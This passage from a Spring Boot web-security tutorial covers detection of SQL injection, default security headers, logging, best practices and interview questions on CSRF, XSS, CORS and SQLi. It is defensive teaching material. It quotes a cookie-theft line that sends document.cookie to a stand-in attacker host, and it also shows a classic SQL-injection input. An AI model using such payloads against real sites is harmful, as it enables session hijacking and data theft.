- **Unusual result sizes / slow queries:** an endpoint that normally returns 1 row suddenly returns thousands, or responses take exactly N seconds (time-based blind SQLi).
- **Static analysis (SAST):** SonarQube, SpotBugs + Find Security Bugs, and Semgrep flag string-concatenated queries in code review.
- **Security testing:** run a scanner such as OWASP ZAP or sqlmap **only against systems you own or are authorized to test**.
- **DB audit / WAF logs:** WAFs flag SQLi signatures in request parameters.

---

## 6. Other attacks Spring Security handles for you

Spring Security adds several protections by default. You can see them in the response headers of the demo app (`X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Cache-Control: no-cache, no-store...`).

| Attack | What it is | Spring Security default |
|---|---|---|
| **Clickjacking** | Your page is loaded in an invisible iframe on evil.com and the user is tricked into clicking buttons | `X-Frame-Options: DENY` (or CSP `frame-ancestors`) |
| **MIME sniffing** | Browser treats an uploaded "image" as HTML/JS | `X-Content-Type-Options: nosniff` |
| **Session fixation** | Attacker makes the victim use a session ID the attacker already knows | New session ID after login (`changeSessionId`) |
| **Protocol downgrade / sniffing** | Traffic intercepted over plain HTTP | `Strict-Transport-Security` (HSTS) on HTTPS requests |
| **Sensitive data cached** | Browser/proxy caches pages with personal data | `Cache-Control: no-cache, no-store, max-age=0, must-revalidate` |
| **Brute force / credential stuffing** | Many login attempts | **Not** by default: add rate limiting, account lockout, CAPTCHA |

---

## 7. How Spring Security fits in

Spring Security works as a **chain of filters**. Every request passes through these filters before it reaches the controller:

![svg](<svgs/12-spring-security-filters-vs-attacks.svg>)

- **CSRF in Spring Boot:** enabled by default; disable it only for truly stateless, cookie-less APIs.
- **XSS in Spring Boot:** use `th:text`, escape output, validate input, use HttpOnly cookies and CSP.
- **CORS in Spring Boot:** configure allowed origins, methods, headers and credentials, and enable `.cors()` in the security chain.
- **SQL injection:** not a Spring Security concern. Use parameters / Spring Data JPA.

---

## 8. How to see that an attack happened (summary)

![svg](<svgs/13-how-to-detect-attacks.svg>)

Useful logging settings (use DEBUG in development only, it's noisy):

```properties
logging.level.org.springframework.security=DEBUG     # CSRF rejections, auth failures, filter decisions
logging.level.org.springframework.web.cors=DEBUG     # rejected origins
logging.level.org.hibernate.SQL=DEBUG                # every SQL statement
```

In production, log **security events** (CSRF rejections, failed logins, 403s) at WARN with the IP, user, `Origin` and `Referer`, and alert on spikes.

---

## 9. Summary & best practices

| Attack | Protects … | Main defense |
|---|---|---|
| CSRF | State-changing requests | CSRF token, SameSite cookies, no state change via GET |
| XSS | Users from malicious scripts | Escape output, validate input, CSP, HttpOnly |
| CORS | Cross-origin reads in the browser | Allow only trusted origins, careful with credentials |
| SQLi | The DB from malicious queries | Parameterized queries, least privilege |

**General best practices**
- ✅ Use POST (PUT/DELETE) for state-changing operations.
- ✅ Always validate & sanitize user input, and **encode on output**.
- ✅ Use secure headers (CSP, X-Content-Type-Options, HSTS, …).
- ✅ Keep dependencies and frameworks updated (`mvn versions:display-dependency-updates`, Dependabot, OWASP Dependency-Check).
- ✅ Never store sensitive data in readable cookies or `localStorage`.
- ✅ Follow the principle of least privilege (DB users, roles, API scopes).
- ✅ Treat **all** user input as untrusted. Never trust it.

---

## 10. Interview Questions

### CSRF

**Q1. What is CSRF?**
An attack that tricks a logged-in user's browser into sending an unwanted state-changing request to a site where the user is authenticated. The browser attaches the session cookie automatically.

**Q2. How does a CSRF attack work?**
The victim logs in (session cookie stored) → visits an attacker page → the page auto-submits a form or loads a URL to the target site → the browser adds the cookie → the server executes the request as the victim.

**Q3. Why does the browser send cookies automatically?**
Cookies are attached based on the request's **destination domain**, not on which page started the request. That's how sessions work across navigation, and CSRF abuses it.

**Q4. How do you prevent CSRF?**
CSRF tokens (Spring Security default), SameSite cookies, no state changes via GET, optional `Origin`/`Referer` checks, and re-authentication for critical actions.

**Q5. CSRF token vs SameSite cookies?**
A token is checked by the server and proves the request came from your own page. SameSite is a browser rule that stops cookies on cross-site requests. Lax still allows top-level GETs, and older browsers may ignore it, so it's defense in depth, not a replacement.

**Q6. Why is CSRF disabled for stateless REST APIs using JWT?**
CSRF needs credentials the browser sends automatically (cookies). A JWT in the `Authorization` header is added by your JavaScript, so an evil site can't make the browser include it. (If the JWT is stored in a cookie, CSRF protection is needed again.)

**Q7. Can CSRF happen with GET? With POST?**
Both. GET is easier (just a link or `<img>`), and Spring's CSRF filter doesn't check GET at all, so never change state with GET. POST is possible with an auto-submitted hidden form, and that's what the CSRF token stops.

### XSS

**Q8. What is XSS, and what are its types?**
Injecting JavaScript into pages viewed by other users. Types: stored (persistent, in the DB), reflected (from the URL, echoed back), and DOM-based (client-side JS writes untrusted data to the DOM).

**Q9. How does XSS work internally?**
The browser parses the HTML. Any `<script>` tag or event handler attribute in the server's response is executed as JS with the site's origin, so it gets full access to the page, its APIs and readable cookies.

**Q10. How does an attacker steal cookies with XSS?**
`fetch('https://attacker.com/steal?c=' + document.cookie)`. This works only for cookies without `HttpOnly`. Even with HttpOnly, the script can still make requests as the user.

**Q11. What's the difference between `th:text` and `th:utext`?**
`th:text` HTML-escapes the value (safe). `th:utext` inserts it unescaped as HTML (dangerous with user input).

**Q12. How do you prevent XSS in Spring Boot?**
Escape on output (`th:text`, frontend frameworks' default binding), validate input, sanitize rich HTML (OWASP sanitizer), add a CSP header via `http.headers()`, and use HttpOnly + Secure cookies.

**Q13. What is CSP? What is an HttpOnly cookie?**
CSP is a response header telling the browser which script/style/image sources are allowed. It blocks inline and foreign scripts. An HttpOnly cookie can't be read by JavaScript (`document.cookie`).

### CORS

**Q14. What is CORS? What is SOP?**
SOP is the browser rule that JS from one origin can't read responses from another origin. CORS is the mechanism (response headers) that lets a server allow specific other origins.

**Q15. Simple vs preflight request?**
A simple request (GET/HEAD/POST with simple headers) is sent directly, and the browser checks the response header. A non-simple request (PUT/DELETE, JSON content type, custom headers like Authorization, credentials) first triggers an `OPTIONS` preflight. The real request is sent only if the preflight allows it.

**Q16. Why does Postman work when the browser blocks the request?**
CORS is enforced only by browsers. Postman/curl don't implement the Same-Origin Policy, so they show the response regardless of CORS headers.

**Q17. What is `allowCredentials` used for, and why not combine it with `*`?**
It allows cookies/HTTP auth on cross-origin requests (`Access-Control-Allow-Credentials: true`). With `*`, any website could read logged-in users' data. Browsers and Spring reject `*` + credentials, and reflecting any origin with credentials is a serious vulnerability.

**Q18. Does CORS protect against CSRF?**
No. For simple requests (like form POSTs) the browser still sends the request. CORS only hides the response from JS. Use CSRF tokens.

### SQL Injection

**Q19. What is SQL injection, and how does it work?**
User input is concatenated into SQL, so specially crafted input (`' OR '1'='1`) changes the query's logic or adds new statements.

**Q20. What are the types of SQLi? Union-based vs blind?**
In-band (union-based, error-based), inferential/blind (boolean-based, time-based), and out-of-band. Union-based returns extra data directly in the response. Blind infers data one bit at a time from true/false or timing differences.

**Q21. Why is a `PreparedStatement` safe?**
The SQL structure is sent and compiled first, and values are bound separately as data. Input can never change the query structure, whatever characters it contains.

**Q22. Is JPA safe from SQLi?**
Derived queries, `@Query` with `:params`, and the Criteria API are safe. JPA is **not** safe if you concatenate strings into `createQuery`/`createNativeQuery`, or if you put user input into `ORDER BY`/column names without an allow-list.

### General

**Q23. Which of these attacks does Spring Security protect against out of the box?**
CSRF (token filter), clickjacking (`X-Frame-Options`), MIME sniffing, session fixation, and HSTS. CORS is supported but needs configuration. XSS needs your templates and CSP. SQL injection is entirely your data-access code.

**Q24. How would you find out that your app was attacked?**
Security logs (CSRF rejections, 401/403 spikes), CSP violation reports, SQL logs and error spikes, WAF logs, unusual traffic patterns in metrics, and audit trails of sensitive actions with IP/Origin/Referer.
